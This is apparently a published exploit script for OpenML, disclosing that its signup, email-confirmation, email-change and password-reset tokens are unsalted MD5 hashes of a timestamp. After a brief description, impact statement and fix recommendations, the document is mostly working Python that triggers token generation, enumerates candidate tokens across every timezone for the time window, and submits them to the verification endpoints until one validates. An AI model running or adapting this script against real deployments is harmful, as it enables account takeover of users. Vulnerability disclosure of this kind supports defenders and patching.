# Exploit Title: Predictable MD5 Token Bypass in OpenML Signup, Confirmation, and Password Reset
# Date: 2025-06-23
# Exploit Author: Kuycheu Kung
# Vendor Homepage: https://www.openml.org/
# Software Link: https://github.com/openml/openml.org
# Version: Affected in v2.0.20241110 (Docker image: openml/frontend:dev_v2.0.20241110)
# Tested on: Ubuntu + Docker (https://github.com/openml/services/blob/main/docker-compose.yaml)
# CVE: N/A (Pending assignment)

"""
Description:
OpenML versions <= v2.0.20241110 use predictable MD5-based tokens for user signup confirmation,
password resets, email confirmation resends, and email change confirmation. Tokens are generated by hashing the current
timestamp formatted as "%d %H:%M:%S" without incorporating user-specific data or cryptographic randomness.

This leads to a critical vulnerability where tokens can be predicted by:
- Triggering token generation endpoints.
- Enumerating tokens across all timezones for the token creation time window.
- Validating these tokens against token verification endpoints.

Impact:
- Full account takeover.
- Unauthorized password resets and account activations.
- No user interaction needed; fully automatable attack.

Usage:
- This script triggers vulnerable endpoints.
- Generates candidate tokens for all timezones within the time window.
- Verifies tokens automatically.
- Stops at first valid token or enumerates all tokens, configurable.

Recommendations:
- Use cryptographically secure random tokens.
- Incorporate user-specific data and secrets in tokens.
- Add rate limiting and monitoring on verification endpoints.
- Invalidate tokens after use and implement expiry.

"""

import hashlib
import json
from datetime import datetime, timezone, timedelta
import requests
import pytz
from time import sleep

# === Configurable Parameters ===
TARGET_HOST = "http://localhost:8000"
EMAIL = "exploituser3@example.org"
NEW_EMAIL = "exploituser4@example.org"
BIO = "Bot Bio"
FIRST_NAME = "Exploit"
LAST_NAME = "Bot"
PASSWORD = "ExploitPass123!"
STOP_ON_FIRST_VALID = True
THROTTLE = 0.1  # polite delay between requests

# === Derived Endpoints ===
FORGOT_PASSWORD_URL = f"{TARGET_HOST}/forgotpassword"
FORGOT_TOKEN_URL = f"{TARGET_HOST}/forgot-token"
SIGNUP_URL = f"{TARGET_HOST}/signup"
RESEND_CONFIRM_URL = f"{TARGET_HOST}/send-confirmation-token"
CONFIRMATION_URL = f"{TARGET_HOST}/confirmation"
PROFILE_URL = f"{TARGET_HOST}/profile"

HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json",
    "Origin": TARGET_HOST,
    "User-Agent": "Mozilla/5.0"
}

def generate_md5_tokens(start_utc, end_utc):
    """Generate MD5 tokens across all timezones within time window."""
    tokens = []
    for tzname in pytz.all_timezones:
        tz = pytz.timezone(tzname)
        local_start = start_utc.astimezone(tz)
        local_end = end_utc.astimezone(tz)
        current_time = local_start
        while current_time <= local_end:
            formatted = current_time.strftime("%d %H:%M:%S")
            token = hashlib.md5(formatted.encode()).hexdigest()
            tokens.append((token, formatted, tzname))
            current_time += timedelta(seconds=1)
    return tokens

def send_post(url, data):
    return requests.post(url, headers=HEADERS, data=json.dumps(data))

# === Triggers ===

def trigger_signup():
    payload = {
        "email": EMAIL,
        "password": PASSWORD,
        "first_name": FIRST_NAME,
        "last_name": LAST_NAME
    }
    start = datetime.now(timezone.utc)
    send_post(SIGNUP_URL, payload)
    end = datetime.now(timezone.utc)
    return start, end

def trigger_resend_confirmation():
    payload = {"email": EMAIL}
    start = datetime.now(timezone.utc)
    send_post(RESEND_CONFIRM_URL, payload)
    end = datetime.now(timezone.utc)
    return start, end

def trigger_forgot_password():
    payload = {"email": EMAIL}
    start = datetime.now(timezone.utc)
    send_post(FORGOT_PASSWORD_URL, payload)
    end = datetime.now(timezone.utc)
    return start, end

def trigger_change_profile():
    payload = {"bio":BIO,"first_name":FIRST_NAME,"last_name":LAST_NAME,"email":NEW_EMAIL}
    start = datetime.now(timezone.utc)
    send_post(PROFILE_URL, payload)
    end = datetime.now(timezone.utc)
    return start, end

# === Verifiers ===

def check_forgot_token(token):
    full_url = f"{TARGET_HOST}/auth/reset-page/?token={token}"
    payload = {"url": full_url}
    response = send_post(FORGOT_TOKEN_URL, payload)
    return response.status_code == 200 and "confirmed" in response.text

def check_activation_token(token):
    full_url = f"{TARGET_HOST}/auth/confirm-page/?token={token}"
    payload = {"url": full_url}
    response = send_post(CONFIRMATION_URL, payload)
    return response.status_code == 200 and "confirmed" in response.text

# === Orchestration ===

def brute_force_token(trigger_func, check_func, label):
    print(f"\n[*] Testing: {label}")
    start_utc, end_utc = trigger_func()
    print(f"[+] Time window (UTC): {start_utc} → {end_utc}")
    print("[*] Generating tokens...")

    tokens = generate_md5_tokens(start_utc, end_utc)
    print(f"[+] {len(tokens)} tokens generated.\n")

    for token, ts, tz in tokens:
        print(f"[>] {tz:<30} | {ts} => {token}")
        if check_func(token):
            print(f"\n✅ VALID token: {token}")
            print(f"   Generated from {ts} in timezone {tz}")
            if STOP_ON_FIRST_VALID:
                print("✓ Stopping due to STOP_ON_FIRST_VALID = True\n")
                return
        sleep(THROTTLE)

    print(f"❌ No valid token found for {label}.")

def main():
    print("=== OpenML Predictable Token Exploit ===")
    brute_force_token(trigger_signup, check_activation_token, "Signup Confirmation")
    brute_force_token(trigger_resend_confirmation, check_activation_token, "Resend Confirmation")
    brute_force_token(trigger_change_profile, check_activation_token, "Change User Email")
    brute_force_token(trigger_forgot_password, check_forgot_token, "Forgot Password Reset")

if __name__ == "__main__":
    main()
Predictable MD5 Token Bypass in Op ... nfirmation, and Password Reset.txt
Displaying Predictable MD5 Token Bypass in OpenML Signup, Confirmation, and Password Reset.txt.